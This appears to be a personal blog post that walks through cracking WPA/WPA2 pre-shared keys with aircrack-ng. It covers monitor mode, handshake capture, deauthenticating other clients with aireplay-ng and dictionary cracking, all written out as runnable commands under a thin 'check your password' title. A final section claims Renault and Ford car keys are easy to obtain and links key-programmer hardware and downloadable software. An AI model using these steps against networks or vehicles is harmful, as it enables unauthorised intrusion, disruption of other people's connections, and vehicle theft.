title: Check your wireless password, or someone could intrude ?
---

# Introduction

Wireless is open to attack. Network can be interuppted at any time.

# Hardware

~~~
lspci -m
~~~

Best is supported some of [this](http://www.wirelesshack.org/top-kali-linux-compatible-usb-adapters-dongles-2015.html)

* AR9271
* RT3070
* RT3572
* RTL8187L

You can check also [aircrack
compatibility drivers](http://www.aircrack-ng.org/doku.php?id=compatibility_drivers)

# Installation

~~~
sudo su
apt-get install aircrack-ng reaver
man airodump-ng
ifconfig # find wireless adapters, for example wlan0

airmon-ng check
airmon-ng check kill
airmon-ng
airmon-ng start wlan0 # this will create another adapter mon0
~~~

`airmon-ng start` will show a message that other programs could interfere. You
can `sudo pkill NetworkManager` but it will just restart it. So far so good, all
those programs could stay running (but you should disconnect from all networks).

# Theory

[WPA/WPA2](https://www.aircrack-ng.org/doku.php?id=cracking_wpa&DokuWiki=3mlmhn080hqo8eb6p0qsqpvas4)
supports many types of authentication, and only PSK (pre-shared key) AUTH is
crackable. There is no difference between cracking WPA and WPA2.
There is no benefit from collectin IVs. Only we can do is to get handshake when
client connects to the network. Than we can test our dictionary with 300 keys
per second.

~~~
# list all networks (BSSID), channel (CH) and clients
airodump-ng mon0 -w output
airodump-ng mon0 --bssid 12:12:12:12:12:12 -w output
# better is to use channel option -c since more packets are stored
airodump-ng mon0 -c 1 -w output
~~~

Instead of waiting you can deauthenticate some clients:

~~~
aireplay-ng -0 1 -a 12:12:12:12:12:12 -c 11:11:11:11:11:11 --ignore-negative-on mon0
# it should returns some number of ACK [ 5|55 ACKs]
~~~

Note that you can capture all networks (any handshare will be stored) but more
packets will be stored if you listen on specific frequency.
On top of the page it should say: `WPA handshake: 12:12:12:12:12:12` but it
could be replaces with some info. You can check anytime if some od handshake are
stored

~~~
aircrack-ng output*.cap
~~~

Use two different cards, when you run `iwconfig` then one should show `IEEE
802.11bg` and another `IEEE 802.11bgn`.

# FNR Renault Ford

Just to note that it's easy to get keys of Renault or Ford cars.
Buy [remote key smart
card](https://www.aliexpress.com/item/2PCS-New-quality-Remote-Key-433-MHz-W-Chip-ID46-for-RENAULT-Megane-Scenic-Smart-Card/32650476913.html)
and [fnr key prog for
renault](https://www.aliexpress.com/item/High-Quality-FNR-Key-Prog-For-Renault-For-Ford-For-Nissan-4-IN-1-Key-Programmer/1000001169897.html)
(you also need a usb key, since it is required for software), software you can
download on
[mediafire](http://www.mediafire.com/file/l6jj1xd855612i5/KEY-PROG-sk127.rar
)

Add self to virtual box users `sudo usermod -a -G vboxusers orlovic` and attach
Usb key and go to settings -> usb -> add -> FTDI FT232R USB UART, cable that you
buyed.

Change port number to ![com port 12]({{ site.baseurl }}/assets/posts/port12.png)
